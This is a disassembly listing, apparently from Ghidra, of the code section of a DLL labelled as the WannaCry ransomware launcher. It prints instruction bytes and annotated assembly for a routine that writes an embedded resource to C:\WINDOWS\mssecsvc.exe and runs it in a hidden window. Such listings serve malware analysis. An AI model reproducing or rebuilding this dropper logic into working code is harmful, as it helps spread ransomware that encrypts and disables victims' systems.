@@ -1,0 +1,271 @@
+; ============================================================================
+; WannaCry launcher DLL  -  .text section disassembly
+; Sample: fcd6ad3cf9eeb9e996c0255893b21bcd
+; Source: Ghidra 11.x ASCII export (CodeBrowser Listing)
+; ----------------------------------------------------------------------------
+; Section range : 0x10001000 - 0x10001fff  (4096 bytes)
+; Instructions  : 248
+; Null padding  : 3444 bytes (0x1000128c - 0x10001fff), collapsed below
+; ----------------------------------------------------------------------------
+; FUNCTION MAP
+;   0x10001000  DllMain          stores hInstance on PROCESS_ATTACH
+;   0x10001016  drop routine     FindResourceA -> WriteFile -> CloseHandle
+;   0x100010ab  launch routine   CreateProcessA (hidden window)
+;   0x10001114  PlayGame         ordinal 1 export; sprintf then calls both
+;   0x1000113e  _CRT_INIT        MSVC runtime boilerplate
+;   0x100011e9  _DllMainCRTStartup
+;   0x10001286  thunk            jmp to MSVCRT _initterm
+; ============================================================================
+
+.text:10001000  8b442408        MOV         EAX,dword ptr [ESP + Stack[0x8]]
+.text:10001004  48              DEC         EAX
+.text:10001005  7509            JNZ         LAB_10001010
+.text:10001007  8b442404        MOV         EAX,dword ptr [ESP + Stack[0x4]]
+.text:1000100b  a33c310010      MOV         [.data:DAT_1000313c],EAX
+.text:10001010  6a01            PUSH        0x1
+.text:10001012  58              POP         EAX
+.text:10001013  c20c00          RET         0xc
+.text:10001016  51              PUSH        ECX
+.text:10001017  56              PUSH        ESI
+.text:10001018  57              PUSH        EDI
+.text:10001019  6810300010      PUSH        .data:DAT_10003010                      ;= 57h    W
+.text:1000101e  6a65            PUSH        DAT_00000065
+.text:10001020  ff353c310010    PUSH        dword ptr [.data:DAT_1000313c]
+.text:10001026  ff1518200010    CALL        dword ptr [->KERNEL32.DLL::FindResour...;= 0000210e
+.text:1000102c  8bf8            MOV         EDI,EAX
+.text:1000102e  85ff            TEST        EDI,EDI
+.text:10001030  742f            JZ          LAB_10001061
+.text:10001032  57              PUSH        EDI
+.text:10001033  ff353c310010    PUSH        dword ptr [.data:DAT_1000313c]
+.text:10001039  ff1514200010    CALL        dword ptr [->KERNEL32.DLL::LoadResource];= 000020fe
+.text:1000103f  85c0            TEST        EAX,EAX
+.text:10001041  741e            JZ          LAB_10001061
+.text:10001043  50              PUSH        EAX
+.text:10001044  ff1510200010    CALL        dword ptr [->KERNEL32.DLL::LockResource];= 000020ee
+.text:1000104a  8bf0            MOV         ESI,EAX
+.text:1000104c  85f6            TEST        ESI,ESI
+.text:1000104e  7411            JZ          LAB_10001061
+.text:10001050  57              PUSH        EDI
+.text:10001051  ff353c310010    PUSH        dword ptr [.data:DAT_1000313c]
+.text:10001057  ff150c200010    CALL        dword ptr [->KERNEL32.DLL::SizeofReso...;= 000020dc
+.text:1000105d  85c0            TEST        EAX,EAX
+.text:1000105f  7504            JNZ         LAB_10001065
+.text:10001061  33c0            XOR         EAX,EAX
+.text:10001063  eb42            JMP         LAB_100010a7
+.text:10001065  53              PUSH        EBX
+.text:10001066  8b1e            MOV         EBX,dword ptr [ESI]
+.text:10001068  6a00            PUSH        0x0
+.text:1000106a  6a04            PUSH        0x4
+.text:1000106c  6a02            PUSH        0x2
+.text:1000106e  6a00            PUSH        0x0
+.text:10001070  6a02            PUSH        0x2
+.text:10001072  6800000040      PUSH        0x40000000
+.text:10001077  6838300010      PUSH        .data:DAT_10003038
+.text:1000107c  ff1508200010    CALL        dword ptr [->KERNEL32.DLL::CreateFileA] ;= 000020ce
+.text:10001082  8bf8            MOV         EDI,EAX
+.text:10001084  83ffff          CMP         EDI,-0x1
+.text:10001087  741a            JZ          LAB_100010a3
+.text:10001089  8d44240c        LEA         EAX=>local_4,[ESP + 0xc]
+.text:1000108d  6a00            PUSH        0x0
+.text:1000108f  50              PUSH        EAX
+.text:10001090  83c604          ADD         ESI,0x4
+.text:10001093  53              PUSH        EBX
+.text:10001094  56              PUSH        ESI
+.text:10001095  57              PUSH        EDI
+.text:10001096  ff1504200010    CALL        dword ptr [->KERNEL32.DLL::WriteFile]   ;= 000020c2
+.text:1000109c  57              PUSH        EDI
+.text:1000109d  ff1500200010    CALL        dword ptr [->KERNEL32.DLL::CloseHandle] ;= 000020b4
+.text:100010a3  6a01            PUSH        0x1
+.text:100010a5  58              POP         EAX
+.text:100010a6  5b              POP         EBX
+.text:100010a7  5f              POP         EDI
+.text:100010a8  5e              POP         ESI
+.text:100010a9  59              POP         ECX
+.text:100010aa  c3              RET
+.text:100010ab  55              PUSH        EBP
+.text:100010ac  8bec            MOV         EBP,ESP
+.text:100010ae  83ec54          SUB         ESP,0x54
+.text:100010b1  57              PUSH        EDI
+.text:100010b2  33d2            XOR         EDX,EDX
+.text:100010b4  33c0            XOR         EAX,EAX
+.text:100010b6  8d7df4          LEA         EDI=>local_10,[EBP + -0xc]
+.text:100010b9  8955f0          MOV         dword ptr [EBP + local_14+0x4],EDX
+.text:100010bc  6a10            PUSH        0x10
+.text:100010be  ab              STOSD       ES:EDI
+.text:100010bf  ab              STOSD       ES:EDI
+.text:100010c0  ab              STOSD       ES:EDI
+.text:100010c1  59              POP         ECX
+.text:100010c2  33c0            XOR         EAX,EAX
+.text:100010c4  8d7db0          LEA         EDI=>local_54,[EBP + -0x50]
+.text:100010c7  f3ab            STOSD.REP   ES:EDI
+.text:100010c9  8d45f0          LEA         EAX=>local_14,[EBP + -0x10]
+.text:100010cc  c745ac440...    MOV         dword ptr [EBP + local_58+0x4],0x44
+.text:100010d3  50              PUSH        EAX
+.text:100010d4  8d45ac          LEA         EAX=>local_58,[EBP + -0x54]
+.text:100010d7  50              PUSH        EAX
+.text:100010d8  52              PUSH        EDX
+.text:100010d9  52              PUSH        EDX
+.text:100010da  6800000008      PUSH        0x8000000
+.text:100010df  52              PUSH        EDX
+.text:100010e0  52              PUSH        EDX
+.text:100010e1  52              PUSH        EDX
+.text:100010e2  6838300010      PUSH        .data:DAT_10003038
+.text:100010e7  52              PUSH        EDX
+.text:100010e8  668955dc        MOV         word ptr [EBP + local_28+0x4],DX
+.text:100010ec  c745d8810...    MOV         dword ptr [EBP + local_2c+0x4],0x81
+.text:100010f3  ff151c200010    CALL        dword ptr [->KERNEL32.DLL::CreateProc...;= 0000211e
+.text:100010f9  85c0            TEST        EAX,EAX
+.text:100010fb  5f              POP         EDI
+.text:100010fc  7412            JZ          LAB_10001110
+.text:100010fe  56              PUSH        ESI
+.text:100010ff  8b3500200010    MOV         ESI,dword ptr [->KERNEL32.DLL::CloseH...;= 000020b4
+.text:10001105  ff75f4          PUSH        dword ptr [EBP + local_10+0x4]
+.text:10001108  ffd6            CALL        ESI=>KERNEL32.DLL::CloseHandle
+.text:1000110a  ff75f0          PUSH        dword ptr [EBP + local_14+0x4]
+.text:1000110d  ffd6            CALL        ESI=>KERNEL32.DLL::CloseHandle
+.text:1000110f  5e              POP         ESI
+.text:10001110  33c0            XOR         EAX,EAX
+.text:10001112  c9              LEAVE
+.text:10001113  c3              RET
+.text:10001114  6828300010      PUSH        .data:s_mssecsvc.exe_10003028           ;= "mssecsvc.exe"
+.text:10001119  6820300010      PUSH        .data:s_WINDOWS_10003020                ;= "WINDOWS"
+.text:1000111e  6814300010      PUSH        .data:s_C:\%s\%s_10003014               ;= "C:\\%s\\%s"
+.text:10001123  6838300010      PUSH        .data:DAT_10003038
+.text:10001128  ff1534200010    CALL        dword ptr [->MSVCRT.DLL::sprintf]       ;= 0000213e
+.text:1000112e  83c410          ADD         ESP,0x10
+.text:10001131  e8e0feffff      CALL        FUN_10001016                            ;undefined FUN_10001016()
+.text:10001136  e870ffffff      CALL        FUN_100010ab                            ;undefined FUN_100010ab()
+.text:1000113b  33c0            XOR         EAX,EAX
+.text:1000113d  c3              RET
+.text:1000113e  8b442408        MOV         EAX,dword ptr [ESP + Stack[0x8]]
+.text:10001142  85c0            TEST        EAX,EAX
+.text:10001144  750e            JNZ         LAB_10001154
+.text:10001146  390540310010    CMP         dword ptr [.data:DAT_10003140],EAX
+.text:1000114c  7e2e            JLE         LAB_1000117c
+.text:1000114e  ff0d40310010    DEC         dword ptr [.data:DAT_10003140]
+.text:10001154  8b0d30200010    MOV         ECX,dword ptr [->MSVCRT.DLL::_adjust_...;= 00002172
+.text:1000115a  83f801          CMP         EAX,0x1
+.text:1000115d  8b09            MOV         ECX,dword ptr [ECX]
+.text:1000115f  890d44310010    MOV         dword ptr [.data:DAT_10003144],ECX
+.text:10001165  753f            JNZ         LAB_100011a6
+.text:10001167  6880000000      PUSH        0x80
+.text:1000116c  ff152c200010    CALL        dword ptr [->MSVCRT.DLL::malloc]        ;= 00002168
+.text:10001172  85c0            TEST        EAX,EAX
+.text:10001174  59              POP         ECX
+.text:10001175  a34c310010      MOV         [.data:DAT_1000314c],EAX
+.text:1000117a  7504            JNZ         LAB_10001180
+.text:1000117c  33c0            XOR         EAX,EAX
+.text:1000117e  eb66            JMP         LAB_100011e6
+.text:10001180  832000          AND         dword ptr [EAX],0x0
+.text:10001183  a14c310010      MOV         EAX,[.data:DAT_1000314c]
+.text:10001188  6804300010      PUSH        .data:DAT_10003004
+.text:1000118d  6800300010      PUSH        .data:DAT_10003000
+.text:10001192  a348310010      MOV         [.data:DAT_10003148],EAX
+.text:10001197  e8ea000000      CALL        MSVCRT.DLL::initterm                    ;undefined initterm()
+.text:1000119c  ff0540310010    INC         dword ptr [.data:DAT_10003140]
+.text:100011a2  59              POP         ECX
+.text:100011a3  59              POP         ECX
+.text:100011a4  eb3d            JMP         LAB_100011e3
+.text:100011a6  85c0            TEST        EAX,EAX
+.text:100011a8  7539            JNZ         LAB_100011e3
+.text:100011aa  a14c310010      MOV         EAX,[.data:DAT_1000314c]
+.text:100011af  85c0            TEST        EAX,EAX
+.text:100011b1  7430            JZ          LAB_100011e3
+.text:100011b3  8b0d48310010    MOV         ECX,dword ptr [.data:DAT_10003148]
+.text:100011b9  56              PUSH        ESI
+.text:100011ba  8d71fc          LEA         ESI,[ECX + -0x4]
+.text:100011bd  3bf0            CMP         ESI,EAX
+.text:100011bf  7212            JC          LAB_100011d3
+.text:100011c1  8b0e            MOV         ECX,dword ptr [ESI]
+.text:100011c3  85c9            TEST        ECX,ECX
+.text:100011c5  7407            JZ          LAB_100011ce
+.text:100011c7  ffd1            CALL        ECX
+.text:100011c9  a14c310010      MOV         EAX,[.data:DAT_1000314c]
+.text:100011ce  83ee04          SUB         ESI,0x4
+.text:100011d1  ebea            JMP         LAB_100011bd
+.text:100011d3  50              PUSH        EAX
+.text:100011d4  ff1524200010    CALL        dword ptr [->MSVCRT.DLL::free]          ;= 00002154
+.text:100011da  83254c310...    AND         dword ptr [.data:DAT_1000314c],0x0
+.text:100011e1  59              POP         ECX
+.text:100011e2  5e              POP         ESI
+.text:100011e3  6a01            PUSH        0x1
+.text:100011e5  58              POP         EAX
+.text:100011e6  c20c00          RET         0xc
+.text:100011e9  55              PUSH        EBP
+.text:100011ea  8bec            MOV         EBP,ESP
+.text:100011ec  53              PUSH        EBX
+.text:100011ed  8b5d08          MOV         EBX,dword ptr [EBP + Stack[0x4]+0x4]
+.text:100011f0  56              PUSH        ESI
+.text:100011f1  8b750c          MOV         ESI,dword ptr [EBP + Stack[0x8]+0x4]
+.text:100011f4  57              PUSH        EDI
+.text:100011f5  8b7d10          MOV         EDI,dword ptr [EBP + Stack[0xc]+0x4]
+.text:100011f8  85f6            TEST        ESI,ESI
+.text:100011fa  7509            JNZ         LAB_10001205
+.text:100011fc  833d40310...    CMP         dword ptr [.data:DAT_10003140],0x0
+.text:10001203  eb26            JMP         LAB_1000122b
+.text:10001205  83fe01          CMP         ESI,0x1
+.text:10001208  7405            JZ          LAB_1000120f
+.text:1000120a  83fe02          CMP         ESI,0x2
+.text:1000120d  7522            JNZ         LAB_10001231
+.text:1000120f  a150310010      MOV         EAX,[.data:DAT_10003150]
+.text:10001214  85c0            TEST        EAX,EAX
+.text:10001216  7409            JZ          LAB_10001221
+.text:10001218  57              PUSH        EDI
+.text:10001219  56              PUSH        ESI
+.text:1000121a  53              PUSH        EBX
+.text:1000121b  ffd0            CALL        EAX
+.text:1000121d  85c0            TEST        EAX,EAX
+.text:1000121f  740c            JZ          LAB_1000122d
+.text:10001221  57              PUSH        EDI
+.text:10001222  56              PUSH        ESI
+.text:10001223  53              PUSH        EBX
+.text:10001224  e815ffffff      CALL        FUN_1000113e                            ;undefined FUN_1000113e()
+.text:10001229  85c0            TEST        EAX,EAX
+.text:1000122b  7504            JNZ         LAB_10001231
+.text:1000122d  33c0            XOR         EAX,EAX
+.text:1000122f  eb4e            JMP         LAB_1000127f
+.text:10001231  57              PUSH        EDI
+.text:10001232  56              PUSH        ESI
+.text:10001233  53              PUSH        EBX
+.text:10001234  e8c7fdffff      CALL        FUN_10001000                            ;undefined FUN_10001000()
+.text:10001239  83fe01          CMP         ESI,0x1
+.text:1000123c  89450c          MOV         dword ptr [EBP + Stack[0x8]+0x4],EAX
+.text:1000123f  750c            JNZ         LAB_1000124d
+.text:10001241  85c0            TEST        EAX,EAX
+.text:10001243  7537            JNZ         LAB_1000127c
+.text:10001245  57              PUSH        EDI
+.text:10001246  50              PUSH        EAX
+.text:10001247  53              PUSH        EBX
+.text:10001248  e8f1feffff      CALL        FUN_1000113e                            ;undefined FUN_1000113e()
+.text:1000124d  85f6            TEST        ESI,ESI
+.text:1000124f  7405            JZ          LAB_10001256
+.text:10001251  83fe03          CMP         ESI,0x3
+.text:10001254  7526            JNZ         LAB_1000127c
+.text:10001256  57              PUSH        EDI
+.text:10001257  56              PUSH        ESI
+.text:10001258  53              PUSH        EBX
+.text:10001259  e8e0feffff      CALL        FUN_1000113e                            ;undefined FUN_1000113e()
+.text:1000125e  85c0            TEST        EAX,EAX
+.text:10001260  7503            JNZ         LAB_10001265
+.text:10001262  21450c          AND         dword ptr [EBP + Stack[0x8]+0x4],EAX
+.text:10001265  837d0c00        CMP         dword ptr [EBP + Stack[0x8]+0x4],0x0
+.text:10001269  7411            JZ          LAB_1000127c
+.text:1000126b  a150310010      MOV         EAX,[.data:DAT_10003150]
+.text:10001270  85c0            TEST        EAX,EAX
+.text:10001272  7408            JZ          LAB_1000127c
+.text:10001274  57              PUSH        EDI
+.text:10001275  56              PUSH        ESI
+.text:10001276  53              PUSH        EBX
+.text:10001277  ffd0            CALL        EAX
+.text:10001279  89450c          MOV         dword ptr [EBP + Stack[0x8]+0x4],EAX
+.text:1000127c  8b450c          MOV         EAX,dword ptr [EBP + Stack[0x8]+0x4]
+.text:1000127f  5f              POP         EDI
+.text:10001280  5e              POP         ESI
+.text:10001281  5b              POP         EBX
+.text:10001282  5d              POP         EBP
+.text:10001283  c20c00          RET         0xc
+.text:10001286  ff2528200010    JMP         dword ptr [->MSVCRT.DLL::initterm]
+
+; ----------------------------------------------------------------------------
+; 0x1000128c - 0x10001fff : 3444 bytes of 0x00 section padding (omitted)
+; ----------------------------------------------------------------------------
